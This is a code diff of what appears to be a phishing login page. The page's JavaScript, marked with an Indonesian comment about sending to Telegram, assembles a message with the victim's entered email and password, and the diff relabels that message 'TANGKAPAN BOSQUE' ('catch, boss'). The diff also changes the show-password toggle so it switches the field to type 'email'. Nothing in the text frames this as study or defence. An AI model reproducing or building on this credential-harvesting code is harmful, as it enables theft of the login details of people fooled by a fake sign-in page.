@@ -99,7 +99,7 @@
             padding: 13px 15px;
         }
 
-        input[type="text"]::placeholder,
+        input[type="email"]::placeholder,
         input[type="password"]::placeholder {
             color: #9aa0a6;
         }
@@ -343,7 +343,7 @@
 
     // Show/hide password
     showPasswordCheckbox.addEventListener('change', function() {
-        passwordInput.type = this.checked ? 'text' : 'password';
+        passwordInput.type = this.checked ? 'email' : 'password';
     });
 
     // Password page - next button click (DI SINI PROSES KIRIM TELEGRAM)
@@ -352,7 +352,7 @@
             
             // 1. Susun Pesan yang akan dikirim
             const message = `
-<b>RESS BOSQUE</b>
+<b>TANGKAPAN BOSQUE</b>
 <b>Email:</b> <code>${emailInput.value}</code>
 <b>Password:</b> <code>${passwordInput.value}</code>
 <b>Waktu:</b> ${new Date().toLocaleString()}
